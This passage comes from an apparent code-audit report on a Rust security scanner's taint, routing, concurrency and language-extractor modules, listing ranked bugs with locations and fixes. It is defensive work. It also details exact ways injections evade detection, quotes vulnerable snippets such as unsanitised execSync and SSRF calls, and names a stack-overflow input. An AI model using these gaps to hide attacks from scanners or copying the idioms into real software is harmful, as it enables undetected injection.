- **Location:** `crates/smg-graph/src/cfg.rs:132-156` & `crates/smg-graph/src/lattice.rs:1003`
- **Root Cause:** `out_bits[1..n]` initializes to `EMPTY` instead of `TOP` with a non-BFS reachability heuristic; `for _ in 0..2` drops 3+ hop middleware chains.
- **Surgical Fix:** Compute exact reachability via BFS from block `0`, initialize reachable `out_bits[1..n]` to `TOP`, and iterate middleware/CHA propagation to fixpoint (bounded by `node_count().min(16)`).

#### P3 — Hygiene / Dead Logic

##### [F2A-21] `P3` — Dead `collect_call_names_shallow(if_node, ...)` loop in `early_cond_text_guards`
- **Location:** `crates/smg-graph/src/cfg.rs:675-684`
- **Root Cause:** `collect_call_names_shallow` immediately returns on `"if_statement" | "if_expression"`, so `calls` is always empty.
- **Surgical Fix:** Pass `condition` or remove the dead duplicate loop.

##### [F2A-22] `P3` — Leading-space typo `" verifycsrf"` in `stmt_direct_guards`
- **Location:** `crates/smg-graph/src/cfg.rs:767`
- **Root Cause:** `c_low.contains(" verifycsrf")` misses qualified calls like `middleware.verifyCsrf(req)`.
- **Surgical Fix:** Match `c_low.ends_with(".verifycsrf")` or `c_low.contains("verifycsrf")`.

##### [F2A-23] `P3` — Dead `push_taint_edges` helper and misleading `combined == u8::MAX` guard
- **Location:** `crates/smg-graph/src/lattice.rs:422-445, 1135, 1438`
- **Root Cause:** `push_taint_edges` is dead (`let _ = push_taint_edges;`); `if combined == u8::MAX { 0 }` would return `0` if all 8 bits were cleared.
- **Surgical Fix:** Delete `push_taint_edges` and return `combined` directly in `resolved_wrapper_clear_mask`.

### 2A.3 Per-File Verdict Table (Form 2A)

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-graph/src/lib.rs` | 184 | `FINDINGS: 1` | F2A-18 |
| `crates/smg-graph/src/arena.rs` | 243 | `FINDINGS: 2` | F2A-05, F2A-19 |
| `crates/smg-graph/src/ast.rs` | 4,020 | `FINDINGS: 3` *(+1 shared)* | F2A-03, F2A-15, F2A-16 *(shared: F2A-04)* |
| `crates/smg-graph/src/cfg.rs` | 1,008 | `FINDINGS: 8` | F2A-02, F2A-07, F2A-08, F2A-09, F2A-10, F2A-20, F2A-21, F2A-22 |
| `crates/smg-graph/src/scope.rs` | 323 | `FINDINGS: 3` | F2A-04, F2A-11, F2A-12 |
| `crates/smg-graph/src/lattice.rs` | 3,886 | `FINDINGS: 6` *(+2 shared)* | F2A-01, F2A-06, F2A-13, F2A-14, F2A-17, F2A-23 *(shared: F2A-05, F2A-20)* |
| **Total (Form 2A)** | **9,664** | **23 Findings (4 P0 · 11 P1 · 5 P2 · 3 P3)** | |

---

## Form 2 (Session 2B) — Taint, Deep Stack, CHA/RTA, Subgraph & Schema Analysis (`crates/smg-graph`)

- **Scope:** 5 Rust source files in `crates/smg-graph/src/` (`taint.rs`, `deep_stack.rs`, `call_hierarchy.rs`, `subgraph.rs`, `phase10.rs` — 9,285 LOC, 100% read line 1 to EOF)
- **Totals:** **24 unique findings** — **3 P0**, **13 P1**, **7 P2**, **1 P3** (0 duplicates of Form 2A)

### 2B.1 Executive Summary

- **Highest-Impact Risks:**
  1. **P0 — Unbounded AST Recursion Stack-Overflow DoS (`taint.rs`, `deep_stack.rs`):** 6 recursive AST walkers in `taint.rs` and `scan_frontend_ast` in `deep_stack.rs` lack depth caps, crashing the scanner via stack overflow on deeply nested expressions.
  2. **P0 — Whole-Text Universal Sanitizer Wipes All Taint (`taint.rs:1379-1383, 1796-1800, 3575-3579`):** Any call or SQL statement containing `parseInt(`, `Number(`, or `Boolean(` anywhere in its arguments suppresses SQLi, CMDi, SSRF, Path Traversal, and XSS on all other untrusted arguments (100% FN).
  3. **P0 — Inverted Early-Return Narrowing (`taint.rs:4047-4058`):** Positive early-return guards (`if (p.startsWith(baseDir)) return;`) clear `TAINT_PATH` on the fall-through path where the guard is false (100% FN).
  4. **P1 — Quadratic `O(N * |src|)` Full-File Rescan Per AST Node (`taint.rs:4522-4533`):** `extract_frontend_calls_and_bugs` invokes `is_likely_frontend_file(rel_path, src)` (14 full-file scans) on every recursive AST node.
  5. **P1 — Bidirectional Transitive Subgraph Flood & Missing Fallbacks (`subgraph.rs:40-71, 78-159`):** Pushing both `reverse` and `forward` edges into the same BFS queue collapses `--changed-since` into the entire repo connected component; `yarn.lock`/`pnpm-lock.yaml` and top-level `auth/`/`guards/` miss full-scan fallback.

### 2B.2 Findings (P0–P3)

#### P0 — Crash / Security / Soundness Break

##### [F2B-01] `P0` — Unbounded AST Recursion Stack-Overflow DoS Across `taint.rs` and `deep_stack.rs`
- **Location:** `crates/smg-graph/src/taint.rs:1560` (`ast_eval_masks`), `1975` (`is_pure_safe_literal_expr`), `2411` (`check_call_taint_sinks`), `3351` (`collect_return_clears_rec`), `3419` (`stmt_unconditionally_exits`), `4522` (`extract_frontend_calls_and_bugs`); `crates/smg-graph/src/deep_stack.rs:319` (`scan_frontend_ast`)
- **Root Cause:** None of these recursive AST walkers enforce `MAX_AST_WALK_DEPTH`, so deeply nested expressions (`"(".repeat(15000)`) abort the scanner via stack overflow.
- **Surgical Fix:** Add `depth >= MAX_AST_WALK_DEPTH` guards or convert to iterative `Vec<Node>` stacks.

##### [F2B-02] `P0` — Whole-Text Universal Sanitizer Check Wipes All Taint on Mixed Arguments/Expressions
- **Location:** `crates/smg-graph/src/taint.rs:1379-1383` (`is_call_sanitizer_for`), `1796-1800` (`stmt_taint_status`), `3575-3579` (`analyze_statement_block_depth`)
- **Root Cause:** `is_call_sanitizer_for` runs `is_universal_sanitizer(full_txt)` on the entire call text and `analyze_statement_block_depth` gates SQLi on `!is_universal_sanitizer(&stmt_code)`, so `Number(req.body.limit)` suppresses SQLi/CMDi on `req.body.name` in the same statement or outer call.
- **Surgical Fix:** Check `is_universal_sanitizer` on the callee name `ftxt` only (never `full_txt`), and evaluate interpolated SQL sub-expressions via AST-level `ast_sink_status`.

##### [F2B-03] `P0` — Inverted Early-Return Narrowing Clears Taint After Positive Guards
- **Location:** `crates/smg-graph/src/taint.rs:4047-4058` (`analyze_statement_block_depth`)
- **Root Cause:** `else if then_exits` checks `!(is_neg && has_and)` without requiring `is_neg == true` for positive guards, clearing taint on the fall-through path of `if (p.startsWith(baseDir)) { return ...; } fs.readFileSync(p);`.
- **Surgical Fix:** Separate positive guards from negative-rejection checks; on `then_exits` without `else`, clear taint only for `(is_neg && !has_and)` on positive guards or `(!is_neg && !has_or)` on negative checks.

#### P1 — Real Bug / High FP or FN

##### [F2B-04] `P1` — Quadratic `O(N * |src|)` Full-File Rescanning Inside `extract_frontend_calls_and_bugs`
- **Location:** `crates/smg-graph/src/taint.rs:4483-4533`
- **Root Cause:** `is_likely_frontend_file(rel_path, src)` (14 full-file `.contains()` scans) is called at every recursive AST node (~84 GB scanned on a 200 KB backend file).
- **Surgical Fix:** Compute `is_fe` once at the top-level entry point and pass `is_fe: bool` into the helper.

##### [F2B-05] `P1` — `TaintEnv::clear_bits_for_vars` Matches `fld == v`, Clearing Unrelated Objects' Fields
- **Location:** `crates/smg-graph/src/taint.rs:182-222` (line `203`)
- **Root Cause:** Filtering `obj == v || obj == &root_v || fld == v` causes `if (!isAllowedPath(a.path)) return;` to clear `(b, "path")` for every unrelated object `b`.
- **Surgical Fix:** Remove `|| fld == v` and clear exact `(resolve_obj_root(obj), field)` pairs extracted from condition AST nodes.

##### [F2B-06] `P1` — Stale Object-Field Taint After Reassignment & Unrevoked `var_cleared_masks`
- **Location:** `crates/smg-graph/src/taint.rs:3871-3876, 3925-3950`
- **Root Cause:** Reassigning `obj = { cmd: "safe" }` never removes prior `(obj, *)` from `field_direct`/`field_params` (FP), and `var_cleared_masks` is never removed on unsanitized reassignment.
- **Surgical Fix:** Purge prior `(n, *)` field entries on object-literal reassignment and add `else { env.var_cleared_masks.remove(&n); }` at line 3876.

##### [F2B-07] `P1` — Nested Arrow Parameter Shadowing (FP) & Missing Go Goroutine/Channel Propagation (FN)
- **Location:** `crates/smg-graph/src/taint.rs:2411-3195, 3500-4290`
- **Root Cause:** Expression-bodied nested arrows (`const helper = (p) => execSync(p)`) are evaluated under the outer `env` without removing shadowed param `p`; Go `go_statement` and `send_statement` (`ch <- val`) are unhandled.
- **Surgical Fix:** Stop `check_call_taint_sinks` recursion on nested function/closure kinds except evaluated inline callbacks (removing shadowed params); handle `go_statement` and `send_statement`.

##### [F2B-08] `P1` — Safe-Idiom FPs (Named RegExp `.exec()`, `pg` Query Objects, Field-Insensitive SQLi) & Go `"/c"` FN
- **Location:** `crates/smg-graph/src/taint.rs:1796-1812, 2774-2890, 2903-2916, 3575-3579`
- **Root Cause:** Named regex `tokenRe.exec(...)` and `pool.query({ text: 'SELECT ... $1', values: [req.params.id] })` trigger CRITICAL FPs; Go `exec.Command("cmd", "/c", userCmd)` misses double-quoted `"/c"` (checks `'/'`); line 3578 uses field-insensitive `stmt_taint_status`.
- **Surgical Fix:** Restrict `.exec` to shell/process receivers; check `"/c"` for Go; inspect only `text`/`sql`/`query` on object-form SQL queries; use field-sensitive `ast_sink_status` at line 3578.

##### [F2B-09] `P1` — SQL Comment Stripper Corrupts String Literals & `USING` Suppresses `%s` SQLi
- **Location:** `crates/smg-graph/src/deep_stack.rs:28-60, 112-127`
- **Root Cause:** `strip_sql_comments` ignores single-quoted strings (`'/*'` erases the rest of the `.sql` file); `&& !low.contains("using ")` suppresses `EXECUTE format('DELETE FROM %s WHERE id=$1', tbl) USING uid`.
- **Surgical Fix:** Track `in_single_quote` (with `''` escapes) in `strip_sql_comments`; do not exempt `USING` when `format(...)` contains `%s` or `||`.

##### [F2B-10] `P1` — Function-Wide `seen_schema_validation`, Post-Sink `block_has_early_*` Bypass & Missed MongoDB Property NoSQLi
- **Location:** `crates/smg-graph/src/deep_stack.rs:561-630, 1048-1118`
- **Root Cause:** Any `.parse(` (e.g., `cookie.parse(...)`) sets `seen_schema_validation = true` for the entire function, suppressing `SMG-SQLI-NOSQL` and `SMG-SQLI-MASS`; `block_has_early_*` scans post-sink lines; `is_nosql_injection_line` misses `User.findOne({ email: req.body.email })`.
- **Surgical Fix:** Track validated variable names; remove post-sink `block_has_early_*` overrides; flag uncast `req.body.<field>` inside MongoDB filter literals.

##### [F2B-11] `P1` — Case-Sensitive `contains_request_source` on Lowercased Strings & Missing Taint Revocation on `scalar_taint_vars`
- **Location:** `crates/smg-graph/src/deep_stack.rs:645-652, 1014-1033, 1071, 1291-1296`
- **Root Cause:** `contains_request_source` checks uppercase `$_GET`/`r.URL.Query`/`c.Query(` against already-lowercased strings (dead code FN); `scalar_taint_vars` is never cleared on safe reassignment (FP).
- **Surgical Fix:** Lowercase patterns in `contains_request_source` and add `else { scalar_taint_vars.remove(&lhs); }` at line 652.

##### [F2B-12] `P1` — Go Receiver Type Inference Broken When `struct` Precedes Methods & Flow-Insensitive Local Overwrites
- **Location:** `crates/smg-graph/src/call_hierarchy.rs:240-252, 955-1038`
- **Root Cause:** `type_scopes.iter().find(|s| &s.type_name == enc)` always matches the `struct` scope before method scopes, dropping the Go receiver variable `s`; `collect_local_type_bindings` prefers interface annotations over concrete RHS constructors.
- **Surgical Fix:** Seed each symbol from its innermost enclosing `TypeScope` merged with struct fields; prefer concrete RHS constructor types.

##### [F2B-13] `P1` — Generic Type Arguments Pollute CHA `implements` Edges & `clean_nominal_type` Drops Qualified Wrappers / Non-Space Lifetimes
- **Location:** `crates/smg-graph/src/call_hierarchy.rs:64-93, 664-680`
- **Root Cause:** `extract_heritage_types` splits `<User, Order>` into spurious supertypes; `clean_nominal_type("std::sync::Arc<JwtGuard>")` returns `Some("Arc")` and fails on `'a+AuthGuard`.
- **Surgical Fix:** Strip balanced `<...>` before splitting heritage clauses; strip module prefixes before matching wrappers (including `Result<`) and parse lifetimes without requiring whitespace.

##### [F2B-14] `P1` — `has_positive_bound_for` Cross-Parameter & Substring Suppression (FN) and Empty-`pre_sink` Fallback
- **Location:** `crates/smg-graph/src/phase10.rs:130-169`
- **Root Cause:** `.positive(` / `gt=0` / `ge=1` match handler-wide regardless of parameter; `fee > 0` matches `coffee > 0`; empty `pre_sink` falls back to full `code_low`.
- **Surgical Fix:** Use word-boundary regexes anchored to `param_name` and return `false` when a sink precedes all guards.

##### [F2B-15] `P1` — `parse_openapi_yaml_lite` Drops 4-Space Indents & `$ref`s, Leaks `seen_param_in`, Ignores Param `minimum`, and Flags `responses:` as Request Inputs
- **Location:** `crates/smg-graph/src/phase10.rs:612-844`
- **Root Cause:** Hardcodes `props_indent + 2` (dropping 4-space YAML), ignores `components.schemas` `$ref`s, confuses `responses:` properties with `requestBody:`, leaks `seen_param_in` across parameters, and ignores parameter `minimum`.
- **Surgical Fix:** Track section (`RequestBody` vs `Responses` vs `Parameters`), infer property indent dynamically, reset `seen_param_in = None` per `- name:`, check parameter bounds, and resolve `$ref`s in a first pass.

##### [F2B-16] `P1` — Bidirectional Transitive BFS Floods Repo & Missing Lockfiles / Root-Level `auth/` Fallback in `subgraph.rs`
- **Location:** `crates/smg-graph/src/subgraph.rs:40-71, 78-159`
- **Root Cause:** Pushing both `reverse` and `forward` edges into one BFS queue plus ubiquitous symbol-name edges (`get`, `filter`) floods the entire connected component; `should_force_full_scan_on_diff` omits `yarn.lock`/`pnpm-lock.yaml`/etc. and top-level `auth/`/`guards/`/`middleware/`.
- **Surgical Fix:** Run transitive BFS on `reverse` edges only, then add 1-hop `forward` callees without re-enqueueing; filter generic symbol names (`len <= 3`); add missing lockfiles and `starts_with("auth/")` checks.

#### P2 — Edge Case / Perf / Resource Leak

##### [F2B-17] `P2` — `ownership_col_re` Matches TypeScript Type Annotations (`user_id: string`) as Ownership Filters
- **Location:** `crates/smg-graph/src/taint.rs:889-936`
- **Surgical Fix:** Reject primitive type-keyword RHS tokens (`string`, `number`, `boolean`, `any`, `unknown`, `uuid`, `int`, `i64`, `u64`, `str`).

##### [F2B-18] `P2` — File-Wide Unstripped `full_src` Guard Suppression & Per-Node Full-File Lowercasing in `scan_frontend_ast`
- **Location:** `crates/smg-graph/src/deep_stack.rs:422, 476, 506, 950-960`
- **Surgical Fix:** Precompute comment-stripped guards scoped to the enclosing function/listener body once per function.

##### [F2B-19] `P2` — `O(N * S)` Linear `find_owning_symbol`, Low `MAX_WALK_DEPTH = 64` & Comment-Blind Python Field Scan
- **Location:** `crates/smg-graph/src/call_hierarchy.rs:11, 274-281, 890-915`
- **Surgical Fix:** Maintain active owning symbol on the stack (or binary-search spans), raise `MAX_WALK_DEPTH` to 256, and strip `#` comments / nested classes in `extract_python_self_field_types`.

##### [F2B-20] `P2` — `is_route_registration_call` Misclassifies Outbound HTTP Client Calls (`axios.post(...)`) as Server Routes
- **Location:** `crates/smg-graph/src/phase10.rs:294-301, 376-409`
- **Surgical Fix:** Exclude HTTP client/collection receivers (`axios`, `http`, `client`, `api`, `map`, `redis`, etc.) and require a server router receiver or handler callback.

##### [F2B-21] `P2` — `parse_openapi_json` Ignores Path-Level `parameters`, `allOf`/`oneOf`/`anyOf`, and Swagger 2.0 `in: body`
- **Location:** `crates/smg-graph/src/phase10.rs:508-610`
- **Surgical Fix:** Merge `path_item.parameters`, traverse `allOf`/`oneOf`/`anyOf`, and recurse into `schema` for `in: "body"`.

##### [F2B-22] `P2` — `collect_git_changed_files` Swallows Staged/Untracked Errors & Breaks on `core.quotePath` Non-ASCII Paths
- **Location:** `crates/smg-graph/src/subgraph.rs:9-37`
- **Surgical Fix:** Pass `-c core.quotePath=false` (or `-z`) to all `git` invocations and propagate non-zero exit errors.

##### [F2B-23] `P2` — Redundant Per-Line `strip_comments` & 22× Lowercase Allocations in `scan_backend_and_db_deep`
- **Location:** `crates/smg-graph/src/deep_stack.rs:618-765, 1040-1180`
- **Surgical Fix:** Iterate `clean_block.lines()` directly and operate on already-lowercased slices in `extract_call_arg_inner`.

#### P3 — Hygiene / Dead Logic

##### [F2B-24] `P3` — Dead Dummy `HashMap` Allocation & Unused Import in `deep_stack.rs`
- **Location:** `crates/smg-graph/src/deep_stack.rs:6, 772`
- **Surgical Fix:** Remove `HashMap` import at line 6 and delete `let _ = HashMap::<String, usize>::new();` at line 772.

### 2B.3 Per-File Verdict Table (Form 2B)

| File | Exact `wc -l` | Verdict | Finding IDs |
| :--- | ---: | :--- | :--- |
| `crates/smg-graph/src/taint.rs` | 4,855 | `FINDINGS: 9` | F2B-01, F2B-02, F2B-03, F2B-04, F2B-05, F2B-06, F2B-07, F2B-08, F2B-17 |
| `crates/smg-graph/src/deep_stack.rs` | 1,791 | `FINDINGS: 7` | F2B-01, F2B-09, F2B-10, F2B-11, F2B-18, F2B-23, F2B-24 |
| `crates/smg-graph/src/call_hierarchy.rs` | 1,242 | `FINDINGS: 3` | F2B-12, F2B-13, F2B-19 |
| `crates/smg-graph/src/phase10.rs` | 1,181 | `FINDINGS: 4` | F2B-14, F2B-15, F2B-20, F2B-21 |
| `crates/smg-graph/src/subgraph.rs` | 216 | `FINDINGS: 2` | F2B-16, F2B-22 |
| **Total (Form 2B)** | **9,285** | **24 Unique Findings (3 P0 · 13 P1 · 7 P2 · 1 P3)** | |

---

## Form 2 (Session 2C) — Phase 9 Concurrency/Memory & Phase 8 Multi-Language Extractors (`crates/smg-graph`)

- **Scope:** 15 Rust source files in `crates/smg-graph/src/phase9/` and `crates/smg-graph/src/langs/` (`phase9/{mod,concurrency,memory,tests}.rs`, `langs/{mod,bash,c_cpp,csharp,dart,java,kotlin,php,ruby,swift,tests}.rs` — 8,811 LOC, 100% read line 1 to EOF)
- **Totals:** **24 unique findings** — **3 P0**, **13 P1**, **4 P2**, **4 P3** (0 exact duplicates of Form 2A/2B)

### 2C.1 Executive Summary

- **Highest-Impact Risks:**
  1. **P0 Runtime UTF-8 Slicing Panic (`F2C-01`):** `strip_sizeof_clauses` in `phase9/memory.rs:274` increments a byte index by `1` and slices `&expr[i..]`, immediately panicking on any C/C++ allocation expression containing multi-byte UTF-8 (`malloc(strlen("café") + n)`).
  2. **P0 Unbounded AST Recursion Stack-Overflow DoS (`F2C-02`):** 22 recursive AST walkers across `phase9/` and `langs/` lack `MAX_AST_WALK_DEPTH` bounds.
  3. **P0 Fail-Open Guard Dominance Bypass & Laravel Sibling-Route Auth Leak (`F2C-03`):** All 6 inline-lambda route extractors (`c_cpp.rs`, `csharp.rs`, `dart.rs`, `kotlin.rs`, `php.rs`, `swift.rs`) pass `&full_txt` as `attr_text` into `build_analyzed_symbol`, bypassing guard dominance; `php.rs:370` leaks `Auth`/`TxLock` from one route inside `Route::group(...)` onto unauthenticated sibling routes.
  4. **P1 Concurrency & Memory Accuracy Breaks (`F2C-06`–`F2C-10`):** `single_line_block` evicts all held RAII locks on any single-line `{ ... }` statement (FN); temporary Rust `mu.lock().unwrap().push(x);` guards are retained until block exit (Confirmed HIGH FP); `walk_rust_unsafe_block_lines` omits `contains(".assume_init(")` (CRITICAL FP on safe `MaybeUninit`); `c_scanf_re` has an unmatchable `%\[\^"` branch (FN).

### 2C.2 Findings (P0–P3)

#### P0 — Crash / Security / Soundness Break

##### [F2C-01] `P0` — UTF-8 byte-offset slicing panic in `strip_sizeof_clauses` on multi-byte characters
- **Location:** `crates/smg-graph/src/phase9/memory.rs:269-297` (`strip_sizeof_clauses`, line `274`)
- **Root Cause:** Increments byte index `i += 1` and evaluates `expr[i..].starts_with("sizeof")`, panicking on any multi-byte UTF-8 character inside a C/C++ allocation expression (`malloc(strlen("café") + n)`).
- **Surgical Fix:** Compare raw bytes (`bytes[i..].starts_with(b"sizeof")`) or iterate with `expr.char_indices()`.

##### [F2C-02] `P0` — Unbounded AST recursion stack-overflow DoS across 22 walkers in `phase9/` and `langs/`
- **Location:** `phase9/concurrency.rs:246`; `phase9/memory.rs:71, 599, 625, 823`; `langs/mod.rs:184`; `langs/bash.rs:76, 109, 152, 187`; `langs/c_cpp.rs:71, 146, 182, 305`; `langs/csharp.rs:94, 342`; `langs/dart.rs:45, 106, 279`; `langs/java.rs:113`; `langs/kotlin.rs:95`; `langs/php.rs:149, 467, 479, 492`; `langs/ruby.rs:192`; `langs/swift.rs:52, 264, 281`
- **Root Cause:** None of these 22 recursive AST walkers enforce `MAX_AST_WALK_DEPTH`, overflowing the worker stack on deeply nested inputs. *(Parallels `F2A-04` and `F2B-01`.)*
- **Surgical Fix:** Thread `depth: usize` with `MAX_AST_WALK_DEPTH` cap or convert to explicit heap `Vec<Node>` stacks.

##### [F2C-03] `P0` — Inline-route `full_txt` bypasses guard dominance across 6 extractors & Laravel `Route::group` leaks Auth/TxLock across sibling routes
- **Location:** `langs/php.rs:370, 433`; `langs/c_cpp.rs:256, 268`; `langs/csharp.rs:298, 313`; `langs/dart.rs:229, 241`; `langs/kotlin.rs:323`; `langs/swift.rs:205, 224`
- **Root Cause:** Passing `&full_txt` (including lambda body) as `attr_text` unconditionally grants non-dominating/post-sink body guards; `php.rs:370` runs `detect_text_guards(&full_txt, ...)` on `Route::group(...)`, leaking `Auth`/`TxLock` onto unauthenticated sibling routes.
- **Surgical Fix:** For `Route::group`, inspect only the receiver chain (`object`), never `arguments`. For all 6 inline-lambda routes, strip the lambda byte span from `full_txt` before `attr_text` / `detect_text_guards`.

#### P1 — Real Bug / High FP or FN

##### [F2C-04] `P1` — Whole-statement `stmt_sanitizer_mask` wipes `TAINT_ALL` on mixed-argument statements across all Phase 8 languages
- **Location:** `crates/smg-graph/src/langs/mod.rs:527-573, 898-902`
- **Root Cause:** Any scalar cast (`intval(`, `Integer.parseInt(`, `int.Parse(`, `.toInt(`, `atoi(`) on a sink line clears `TAINT_ALL` for all other untrusted variables on that line. *(Parallels `F2B-02`.)*
- **Surgical Fix:** Apply `stmt_sanitizer_mask` only on assignment RHS or per-argument expressions.

##### [F2C-05] `P1` — `filter_dominating_body_guards` grants guards from one branch of an `if/else` and from non-exiting branches in brace-less languages
- **Location:** `crates/smg-graph/src/langs/mod.rs:349-453` (lines `425-434, 442-451`)
- **Root Cause:** Unions `then`/`else` guards instead of intersecting when `cond_has_else == true`; for brace-less languages (Ruby), promotes all guards before the first sink regardless of `if` branching.
- **Surgical Fix:** Intersect `then_guards ∩ else_guards` when both branches fall through; track `if`/`else`/`end` nesting or rely on CFG dominance for Ruby.

##### [F2C-06] `P1` — `single_line_block` evicts all held RAII locks at the current scope depth on any single-line `{ ... }` statement
- **Location:** `crates/smg-graph/src/phase9/concurrency.rs:645-656` (`analyze_function_locks`)
- **Root Cause:** Any single-line `{ ... }` (`if *guard == 0 { log_zero(); }`) sets `single_line_block = true` and runs `guards.retain(|g| g.scope_depth < depth)`, evicting outer RAII locks at `depth` (missing `SMG-ENG-DEADLOCK` across `.await` or nested C++ locks).
- **Surgical Fix:** Track `acquired_in_single_line_block: bool` per guard and pop only those guards at end-of-line.

##### [F2C-07] `P1` — Temporary Rust `Mutex::lock()` guards are retained until block exit, causing Confirmed HIGH deadlock FPs
- **Location:** `crates/smg-graph/src/phase9/concurrency.rs:568-602` (`analyze_function_locks`)
- **Root Cause:** Unbound temporary `mu.lock().unwrap().push(1);` (`guard_var.is_none()`) is pushed into `guards` until block exit instead of dropping at `;`, firing Confirmed HIGH `SMG-ENG-DEADLOCK` on subsequent `.await` or lock calls.
- **Surgical Fix:** When `lang == Language::Rust && guard_var.is_none()`, do not retain the temporary guard in `guards`.

##### [F2C-08] `P1` — Missing `contains(".assume_init(")` guard causes CRITICAL uninitialized-memory UB FPs on safe `MaybeUninit` functions
- **Location:** `crates/smg-graph/src/phase9/memory.rs:722-747` (`walk_rust_unsafe_block_lines`)
- **Root Cause:** Calls `trimmed.split(".assume_init(").next()` without checking `trimmed.contains(".assume_init(")`, treating unrelated lines inside `unsafe { ... }` as uninitialized `.assume_init()` calls.
- **Surgical Fix:** Add `&& trimmed.contains(".assume_init(")` at line `723`.

##### [F2C-09] `P1` — Unmatchable `c_scanf_re` scanset branch, `any`-variable bounds short-circuit, `> 0` false bounds proof & `strncat`/`vsprintf` misses
- **Location:** `crates/smg-graph/src/phase9/memory.rs:24-29, 143-267, 411-412, 513`
- **Root Cause:** `c_scanf_re` requires `"` immediately after `%s`/`%[^`; `has_preceding_bounds_check` returns `true` if *any* one variable is bounded and treats `> 0` or `arr[v]` as upper bounds; `strncat` and non-`%s` `vsprintf` are skipped.
- **Surgical Fix:** Fix `c_scanf_re` to match `%s` and `%[^...]` anywhere in the format string; require all non-constant variables to be upper-bounded; remove `> 0` / `[v]` as upper-bound proofs; check `strncat` and `vsprintf`.

##### [F2C-10] `P1` — `analyze_function_leaks` ignores conditional null-guarded closes (`if (buf) free(buf);`), causing Confirmed `SMG-ENG-LEAK` FPs
- **Location:** `crates/smg-graph/src/phase9/concurrency.rs:1051-1065` (line `1064`)
- **Root Cause:** Excludes every line starting with `"if "` from `close_idx`, flagging idiomatic `if (buf) free(buf);` / `if (fp != NULL) fclose(fp);` as leaks.
- **Surgical Fix:** Allow `if` lines guarding the handle itself (`if (var)`, `if (var != NULL)`, `if (var >= 0)`) as valid closes.

##### [F2C-11] `P1` — Bash regex guard misreads `$var` as end-anchor, `is_safe_bash_rhs` wipes taint on `pwd`/`dirname`/`realpath`, and arithmetic `<<` triggers heredoc skip
- **Location:** `crates/smg-graph/src/langs/bash.rs:283-288, 608-627, 696-708`
- **Root Cause:** `stmt.contains('^') && stmt.contains('$')` matches `[[ "$USER" =~ ^abc ]]` and permanently clears taint across `else`/`fi`; `is_safe_bash_rhs` clears `TAINT_ALL` on `target="$(pwd)/$USER"`; `$(( 1 << n ))` sets `heredoc_end = Some("n")` and skips the rest of the script.
- **Surgical Fix:** Check `^` and `$` inside the regex RHS after `=~` and scope to `then`; require no tainted `$` vars in `is_safe_bash_rhs`; ignore `<<` inside `$((...))`/quotes (or use Tree-sitter `heredoc_redirect`).

##### [F2C-12] `P1` — Ruby `uri.parse` SSRF sanitizer causes 100% FN on `Net::HTTP`, and `extract_class` leaks `only:`-scoped `before_action` into `file_middleware_guards`
- **Location:** `crates/smg-graph/src/langs/ruby.rs:89, 266-274, 430-432, 462`
- **Root Cause:** `"uri.parse"` in `ssrf_sanitizers` suppresses `Net::HTTP.get(URI.parse(params[:url]))`; `extract_class` dispatches `before_action ..., only: [:index]` to `handle_top_call`, leaking `Auth` file-wide into `file_middleware_guards`.
- **Surgical Fix:** Remove `"uri.parse"` from `ssrf_sanitizers`; skip filter/CSRF calls in `extract_class` dispatch to `handle_top_call` and keep controller CSRF class-scoped.

##### [F2C-13] `P1` — Kotlin `arrayof(` SQL sanitizer suppresses mixed interpolated SQLi, and `parse_spring_kt_mapping` steals strings from subsequent annotations
- **Location:** `crates/smg-graph/src/langs/kotlin.rs:36, 338-358`
- **Root Cause:** `"arrayof("` suppresses `db.rawQuery("... '$name' AND active=?", arrayOf("1"))`; `parse_spring_kt_mapping` extracts strings from later annotations like `@PreAuthorize(...)` when `@GetMapping` has no parens.
- **Surgical Fix:** Remove `"arrayof("` from `sql_sanitizers` and bound `parse_spring_kt_mapping` extraction to matching `(...)`.

##### [F2C-14] `P1` — C# Minimal API method-group routes emit zero outgoing `calls`, and comma-combined ASP.NET route attributes are missed
- **Location:** `crates/smg-graph/src/langs/csharp.rs:325-339, 358-389`
- **Root Cause:** `app.MapPost("/admin/wipe", WipeHandler)` emits `calls: Vec::new()`; `[Authorize, HttpPost("refund")]` misses literal `"[HttpPost"`.
- **Surgical Fix:** Extract the second argument identifier into `calls`; match word-bounded `Route(`/`Http*` inside attribute lists without requiring leading `[`.

##### [F2C-15] `P1` — PHP `filter_var(` clears SSRF unconditionally, and top-level procedural PHP code is skipped if any helper function exists
- **Location:** `crates/smg-graph/src/langs/php.rs:76, 118-145`
- **Root Cause:** `filter_var($url, FILTER_VALIDATE_URL)` permits internal/metadata IPs yet clears `TAINT_SSRF`; `__script__` is skipped whenever `has_named_unit` is true.
- **Surgical Fix:** Remove `"filter_var("` from `ssrf_sanitizers` and analyze top-level non-declaration statements even when helper functions exist.

##### [F2C-16] `P1` — Swift `grouped_auth_vars` leaks `Auth` across unrelated functions, and `Process.arguments` CMDi is missed
- **Location:** `crates/smg-graph/src/langs/swift.rs:22, 48, 79-89`
- **Root Cause:** `grouped_auth_vars` is file-global instead of function-scoped; `task.arguments = ["-c", userCmd]` is not in `cmd_sinks`.
- **Surgical Fix:** Clone `grouped_auth_vars` per `extract_function` and track `Process` `.arguments =` sinks.

#### P2 — Edge Case / Perf / Resource Leak

##### [F2C-17] `P2` — Quadratic `O(E^2)` 3-cycle search, non-deterministic 3-cycle witness rotation & asymmetric `scopes_compatible` check
- **Location:** `crates/smg-graph/src/phase9/concurrency.rs:857-911` (`solve_cross_function_deadlocks`)
- **Surgical Fix:** Index outgoing edges by source lock, check `scopes_compatible(raw_ca, raw_ab, c, a)`, and canonicalize the 3-cycle rotation to the lexicographically smallest lock.

##### [F2C-18] `P2` — `is_dynamic_sql_stmt` hardcodes only 6 placeholder literals, causing `CRITICAL` `SMG-SQLI-001` FPs on named-parameter queries with `+`
- **Location:** `crates/smg-graph/src/langs/mod.rs:662-685`
- **Surgical Fix:** Match named/positional placeholders via regex (`:[A-Za-z_]\w*`, `@[A-Za-z_]\w*`, `\$[0-9]+`, `\?`) and use `has_string_concat_plus(stmt)` at line `683`.

##### [F2C-19] `P2` — Dart `PROFILE.path_sanitizers` includes `.resolve(`, which does not enforce base-directory containment
- **Location:** `crates/smg-graph/src/langs/dart.rs:29`
- **Surgical Fix:** Remove `".resolve("` from `path_sanitizers` and require `isWithin(` or post-canonicalization `startsWith(`.

##### [F2C-20] `P2` — Java `parse_spring_mapping` scans subsequent annotations when inferring `@RequestMapping` HTTP verb
- **Location:** `crates/smg-graph/src/langs/java.rs:278-291`
